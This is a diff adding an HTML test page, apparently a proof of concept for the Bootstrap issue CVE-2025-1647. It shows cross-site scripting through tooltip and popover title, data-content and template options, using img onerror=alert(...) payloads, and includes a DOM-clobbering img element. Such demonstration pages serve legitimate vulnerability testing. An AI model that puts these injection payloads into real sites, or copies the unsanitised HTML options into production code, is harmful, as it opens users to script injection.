@@ -1,0 +1,63 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>CVE-2025-1647</title>
+    <link rel="stylesheet" href="../dist/css/bootstrap.min.css">
+    <script src="../docs/assets/js/vendor/jquery.min.js"></script>
+    <script src="../dist/js/bootstrap.js"></script>
+</head>
+
+<body>
+
+    <div class="container">
+
+        <div class="page-header">
+            <h1>CVE-2025-1647</h1>
+        </div>
+
+        <img name="implementation" src="clobbered" style="display: none;" />
+
+        <h2>Template Injection</h2>
+
+        <button type="button" id="template-tooltip" data-toggle="tooltip" data-placement="top"
+            title="Tooltip on top">Template Tooltip</button>
+
+        <button type="button" id="template-popover" data-toggle="popover" title="Popover Title"
+            data-content="Some content inside the popover">Template Popover</button>
+
+        <h2>HTML Injection</h2>
+
+        <button type="button" id="html-tooltip" data-toggle="tooltip" data-html="true" data-placement="top"
+            title="hello <img src=x onerror=alert('title-tooltip')>">HTML Tooltip</button>
+
+        <button type="button" id="html-title-popover" data-html="true" data-toggle="popover"
+            title="hello <img src=x onerror=alert('title-popover')>">HTML Title Popover</button>
+
+        <button type="button" id="html-data-popover" data-html="true" data-toggle="popover"
+            data-content="hello <img src=y onerror=alert('data-content-popover')>">HTML Data Popover
+        </button>
+
+    </div>
+
+    <script>
+        $(document).ready(function () {
+            $("#html-tooltip").tooltip();
+            $("#template-tooltip").tooltip({
+                template: '<p>hello</p><img src=z onerror=alert("template-tooltip")>'
+            });
+
+            $("#html-title-popover").popover();
+            $("#html-data-popover").popover();
+            $("#template-popover").popover({
+                template: '<p>hello</p> <img src=z onerror=alert("template-popover")>'
+            })
+        });
+    </script>
+
+</body>
+
+</html>
